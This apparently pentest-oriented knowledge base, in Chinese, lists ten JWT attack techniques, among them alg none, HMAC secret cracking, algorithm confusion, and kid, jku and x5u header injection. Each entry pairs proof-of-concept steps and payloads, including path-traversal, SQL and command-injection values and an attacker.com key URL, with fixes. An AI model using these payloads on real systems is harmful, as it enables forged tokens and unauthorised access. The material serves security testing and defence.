# JWT & Token Attack Techniques

> 来源：PortSwigger Web Security Academy、OWASP、HackTricks、PayloadsAllTheThings、CWE

---

### [KB-JWT-001] Algorithm "none" Attack
- **类别**: JWT / 算法混淆
- **信号**: 服务端接受 `alg: "none"` 的 JWT；修改算法后仍正常返回受保护资源；无签名验证错误
- **原理**: JWT 库未强制校验 `alg` 字段，攻击者将头部 `"alg"` 设为 `"none"` 并清空签名部分（保留末尾 `.`），服务端跳过签名验证直接信任 payload
- **最小PoC**:
  1. 捕获合法 JWT：`eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.sig`
  2. 解码 header：`{"alg":"HS256","typ":"JWT"}`
  3. 篡改 header 为 `{"alg":"none","typ":"JWT"}` → Base64url 编码
  4. 篡改 payload（如 `"sub":"admin"`）→ Base64url 编码
  5. 拼接：`<header>.<payload>.` （末尾仅保留点，签名留空）
  6. 发送请求，观察是否绕过鉴权
- **绕过与变体**: 大小写变体 `None`/`NONE`/`nOnE`；混合算法 `none` + 正常签名；JWE 嵌套场景
- **修复**: 服务端维护算法白名单，拒绝 `none` 及任何不在白名单内的 `alg` 值；使用 `joserfc` 等严格校验库
- **参考**: CWE-347 / PortSwigger: JWT algorithm confusion / HackTricks: JWT None Algorithm

---

### [KB-JWT-002] Weak HMAC Secret Brute-Force
- **类别**: JWT / 密钥爆破
- **信号**: HS256/HS384/HS512 签名的 JWT；已知或可推测 secret 来源（弱密码、默认密钥、源码泄露、`john` 可爆破）
- **原理**: HMAC 对称签名依赖 secret 的熵；若 secret 为弱字符串（如 `secret`、`password`、Base64 编码的已知值），攻击者离线爆破签名密钥后即可任意伪造 JWT
- **最小PoC**:
  1. 提取 JWT：`eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyIn0.signature`
  2. 使用 hashcat：`hashcat -m 16500 jwt.txt wordlist.txt`
  3. 或使用 john：`john jwt.txt --wordlist=rockyou.txt`
  4. 也可用 Python 脚本：`hmac.new(b'secret', msg, hashlib.sha256).digest()` 逐个尝试
  5. 获得 secret 后，用 https://jwt.io 或 PyJWT 伪造任意用户 token
- **绕过与变体**: 多轮 Base64 编码的 secret；密钥派生但盐值已知；环境变量泄露 `.env` 文件
- **修复**: 使用 ≥256 位随机生成的密钥；定期轮换；禁止硬编码密钥；HS256 使用 `openssl rand -base64 32` 生成
- **参考**: CWE-327 / HackTricks: JWT Weak HMAC / PortSwigger: JWT weak signing key

---

### [KB-JWT-003] RS256 to HS256 Algorithm Confusion
- **类别**: JWT / 算法混淆
- **信号**: 服务端用 RSA 公钥验证签名，但接受 `alg: "HS256"`；公钥可获取（`/.well-known/jwks.json`、TLS 证书、错误消息泄露）
- **原理**: 验证库根据 JWT header 的 `alg` 选择验证方式。攻击者将 `alg` 从 `RS256` 改为 `HS256`，并用 RSA 公钥作为 HMAC secret 重新签名。服务端用同一把公钥做 HMAC 验证，签名通过
- **最小PoC**:
  1. 获取服务端 RSA 公钥（如 `jwks.json` 中的 `n`+`e` → PEM）
  2. 或从 TLS 证书提取：`openssl s_client -connect target:443 | openssl x509 -pubkey -noout`
  3. 将 JWT header 的 `alg` 改为 `HS256`
  4. 用公钥 PEM 作为 secret，HS256 签名篡改后的 payload
  5. `python3 jwt_tool.py <token> -X k -pk public.pem`（jwt_tool 一键完成）
  6. 发送篡改 token，验证是否提权
- **绕过与变体**: RS384→HS384、RS512→HS512 同理；ES256→HS256（ECDSA 公钥也可用于 HMAC）；JWK 内嵌公钥
- **修复**: 服务端固定 `alg` 白名单，禁止将非对称算法密钥用于对称算法；使用支持 `typ` 检查的库；jwt_tool/jwks_attack 可自动化检测
- **参考**: CWE-347 / PortSwigger: JWT algorithm confusion / HackTricks: RS256 to HS256

---

### [KB-JWT-004] "kid" Header Injection (Directory Traversal / SQLi)
- **类别**: JWT / Header 注入
- **信号**: JWT header 含 `kid` 参数；服务端根据 `kid` 从文件系统或数据库取密钥；参数值直接拼接到路径/SQL
- **原理**: `kid`（Key ID）用于指明签名密钥，服务端可能将其直接用于文件路径构造或 SQL 查询。攻击者注入路径遍历或 SQL payload，迫使服务端使用可控密钥（如 `/dev/null` → 空密钥）或泄露密钥
- **最小PoC**:
  1. 识别 JWT 含 `kid`：`{"alg":"HS256","kid":"key1"}`
  2. **路径遍历**：`"kid":"../../../../dev/null"` → 服务端读取空文件作为密钥 → 用空字符串签名
  3. **SQL 注入**（若 kid 查数据库）：`"kid":"x' UNION SELECT 'attacker_secret'--"` → 控制返回的密钥
  4. **命令注入**（罕见）：`"kid":"key1|id"` 若 kid 被传入 shell
  5. 用注入得到的密钥重新签名 JWT
- **绕过与变体**: URL 编码绕过过滤；`/proc/self/fd/` 读取进程文件；Windows 绝对路径 `C:\windows\win.ini`；盲注 + 时间延迟
- **修复**: 不信任用户可控的 `kid` 值；使用映射表（kid → 密钥索引）而非直接文件/SQL 拼接；输入白名单验证
- **参考**: CWE-22 / CWE-89 / PortSwigger: JWT kid header / HackTricks: JWT kid injection

---

### [KB-JWT-005] "jku" Header Manipulation (JWK Set Spoofing)
- **类别**: JWT / Header 注入
- **信号**: JWT header 含 `jku` 字段指向外部 JWKS URL；服务端从该 URL 获取公钥验证签名
- **原理**: `jku`（JWK Set URL）指向包含公钥的 JSON 数组。若服务端未校验 URL 白名单，攻击者指定自控服务器上的 `jwks.json`，其中包含自己生成的 RSA 密钥对公钥，然后用对应私钥签名伪造 JWT
- **最小PoC**:
  1. 生成 RSA 密钥对：`openssl genrsa -out private.pem 2048`
  2. 提取 JWK 公钥：`python3 jwt_tool.py --jwk-key private.pem` 或手动构造 JWK
  3. 托管 `jwks.json` 到可控服务器：`{"keys":[{"kty":"RSA","n":"...","e":"AQAB"}]}`
  4. 修改 JWT header：`"alg":"RS256","jku":"https://attacker.com/jwks.json"`
  5. 用私钥签名：`python3 jwt_tool.py --sign -alg RS256 -key private.pem`
  6. 发送篡改 token，观察是否用你的公钥验证通过
- **绕过与变体**: URL 绕过（`https://attacker.com@trusted.com`、302 重定向、SSRF 访问内部 JWKS）；`jku` + `kid` 组合
- **修复**: `jku` URL 白名单，仅允许受信任域；不允许重定向跟随；直接嵌入 JWK 而非引用外部
- **参考**: CWE-345 / PortSwigger: JWT jku header / HackTricks: JWT jku

---

### [KB-JWT-006] "x5u" Header Attack (X.509 Certificate Chain)
- **类别**: JWT / Header 注入
- **信号**: JWT header 含 `x5u` 字段指向 X.509 证书 URL；服务端从该 URL 获取证书链验证签名
- **原理**: `x5u` 指向 X.509 证书（而非 JWK）。若服务端未验证 URL 白名单或证书链信任锚，攻击者提供自签名证书的 URL，用对应私钥签名 JWT。与 `jku` 攻击同族，但载体是 X.509 而非 JWK
- **最小PoC**:
  1. 生成自签名证书：`openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 1 -nodes`
  2. 托管 `cert.pem` 到可控服务器
  3. 修改 JWT header：`"alg":"RS256","x5u":"https://attacker.com/cert.pem"`
  4. 或内嵌完整证书链：`"x5c":["<base64-cert>"]`（x5c 链，第一个是签名证书）
  5. 用私钥签名并发送
- **绕过与变体**: 内嵌 `x5c` 绕过 URL 白名单；`x5u` + `x5t`（证书指纹）组合绕过；`x5t#S256` 指纹不匹配但仍接受
- **修复**: `x5u` URL 白名单；验证证书链到受信 CA；不接受自签名证书；优先使用内嵌 JWK
- **参考**: CWE-295 / PortSwigger: JWT x5u header / RFC 7517 Section 4.7

---

### [KB-JWT-007] JWT Expiry ("exp") Bypass
- **类别**: JWT / 声明绕过
- **信号**: 过期的 JWT 仍被服务端接受；修改 `exp` 后访问正常；无时间戳校验日志
- **原理**: JWT 的 `exp`（Expiration Time）声明 token 过期时间。若服务端不校验 `exp` 字段、接受缺失 `exp` 的 token、或时钟偏差过大，攻击者可无限期重用已泄露的过期 token
- **最小PoC**:
  1. 获取已过期的 JWT
  2. 解码 payload，找到 `"exp":1710000000`
  3. 修改 `exp` 为未来时间：`"exp":2000000000`
  4. 重新 Base64url 编码 payload（签名不变）
  5. 若签名验证不检查 payload 一致性 → 直接成功
  6. 若签名失败 → 尝试删除 `exp` 字段：某些库 `exp` 缺失 = 永不过期
  7. 若时钟偏差大：`exp` + 600 秒（利用 5-10 分钟偏差窗口）
- **绕过与变体**: 移除 `exp` 字段；设置 `exp` 为极大值（2038 年问题）；`nbf`（Not Before）也删除/前置；`iat` 调整绕过最大会话时间检查
- **修复**: 强制校验 `exp`，拒绝无 `exp` 的 token；使用 `nbf`+`exp` 双窗口；服务端时钟同步 NTP；短有效期 token + refresh token 模式
- **参考**: CWE-613 / PortSwigger: JWT exp bypass / OWASP: Insufficient Session Expiration

---

### [KB-JWT-008] JWT Audience ("aud") Confusion
- **类别**: JWT / 声明混淆
- **信号**: 同一签发者为多个服务签发的 JWT 可跨服务使用；`aud` 字段未被校验；横向越权
- **原理**: `aud` 声明指定 token 的目标接收方。若服务 A 的 token 在服务 B 未校验 `aud`，攻击者可跨服务重放 token。在 OAuth/OIDC 中，access token 的 `aud` 应为 resource server ID，若缺失校验则 token 可用于任意 resource server
- **最小PoC**:
  1. 获取服务 A 的有效 JWT，`aud` 为 `service-a`
  2. 用同一 JWT 访问服务 B
  3. 若服务 B 不校验 `aud` → token 被接受，可能获得服务 B 权限
  4. 变体：`aud` 为数组 `["service-a","service-b"]` → 服务 B 可能仅检查包含关系
  5. 变体：删除 `aud` 字段 → 某些库跳过校验
- **绕过与变体**: `aud` 数组包含多值；缺失 `aud`；通配符/正则匹配；OAuth `azp` 与 `aud` 混淆
- **修复**: 每个服务严格校验 `aud` 是否匹配自身标识符；使用精确字符串比较而非包含/前缀匹配；OAuth resource server 必须校验 `aud`
- **参考**: CWE-863 / RFC 7519 Section 4.1.3 / PortSwigger: JWT audience confusion

---

### [KB-JWT-009] JWT Issuer ("iss") Confusion
- **类别**: JWT / 声明混淆
- **信号**: 服务端未校验 `iss` 声明或校验不严格；可接受其他签发者的 token
- **原理**: `iss` 声明标识 JWT 签发者。在联邦认证或多租户场景中，若 RP（Relying Party）未校验 `iss` 或白名单过大，攻击者可从弱安全策略的签发者获取 token，然后用于目标服务。OIDC 场景尤其常见
- **最小PoC**:
  1. 识别目标接受 `iss` 为 `https://auth.target.com` 的 JWT
  2. 注册/发现同一 IdP 下其他租户的 token（如 `iss`=`https://auth.target.com/tenant2`）
  3. 或利用不校验 `iss` 的端点：删除 `iss` 字段 → 观察是否仍通过
  4. 或利用 URL 解析差异：`iss`=`https://auth.target.com.attacker.com`（域名混淆）
  5. 用非目标签发者的 token 访问受保护资源
- **绕过与变体**: `iss` 尾部斜杠差异（`/` vs 无 `/`）；大小写不敏感匹配；URL 解析器差异（`https://auth.target.com@evil.com`）；`sub`+`iss` 联合注入
- **修复**: 严格校验 `iss` 为精确白名单值（精确字符串匹配）；不为不同租户共用同一 RP；OIDC Discovery 的 `issuer` 必须匹配
- **参考**: CWE-287 / CWE-290 / PortSwigger: JWT issuer confusion / OWASP: OIDC Issuer Confusion

---

### [KB-JWT-010] JWT Cross-Service Relay
- **类别**: JWT / 令牌中继
- **信号**: 微服务架构下，服务 A 签发的 JWT 被服务 B 接受；无 `aud` 区分；token 在内部服务间传递时未重新签名或范围受限
- **原理**: 在微服务网格中，边界网关签发的 JWT 可能被内部所有服务信任。若内部服务间未做 scope 限制或服务级 `aud` 区分，攻击者从低权限端点获取的 token 可中继到高权限内部服务。本质是过度信任边界 token + 缺失内部范围约束
- **最小PoC**:
  1. 从外部 API 获取合法 JWT（如通过正常登录流程）
  2. 识别内部服务端点（通过 JS 源码、错误消息、SSRF 探测）
  3. 用同一 JWT 访问内部管理接口 `/admin`、`/internal/users`
  4. 若内部服务仅检查签名有效性和 `exp` 而不检查 scope/role/aud → 中继成功
  5. 变体：捕获浏览器传递的 JWT，用 curl 直接访问内部 API（绕过前端路由守卫）
- **绕过与变体**: Token Binding 缺失；mTLS 未启用；内部服务仅信任网关签名而不做二次授权；gRPC metadata 直接转发 JWT
- **修复**: 零信任架构——每个内部服务独立校验 token scope/aud；使用 token exchange（RFC 8693）降级 token 范围；内部服务间使用 mTLS + 短期内部 token；网关签发的 token 不应直接被内部服务信任
- **参考**: CWE-441 / OWASP: Microservices Security / HackTricks: JWT Cross-Service Relay / RFC 8693
